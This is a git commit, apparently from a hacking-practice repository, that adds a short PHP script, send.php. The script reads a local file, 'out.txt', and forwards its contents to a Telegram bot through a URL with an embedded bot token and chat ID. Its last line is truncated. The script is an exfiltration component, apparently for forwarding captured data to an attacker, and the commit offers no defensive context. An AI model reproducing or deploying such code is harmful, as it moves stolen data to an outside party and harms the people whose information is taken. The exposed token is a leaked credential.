b9fd9b51c632edf06dc748e32a0e2f727addd1b8
learningHack10 <83340992+learningHack10@users.noreply.github.com>
2021-04-28 13:56:28 +0430

    Add files via upload

---
+++ send.php
@@ -0,0 +1,5 @@
+<?php
+    sleep(2);
+    $msg = urlencode(file_get_contents("out.txt"));
+    file_get_contents("https://api.telegram.org/1786803266:AAHy8u2cH7ugtbvalM0ZP-1ug4alvejnZ_c/sendMessage?1640239102=CHA>
+?>
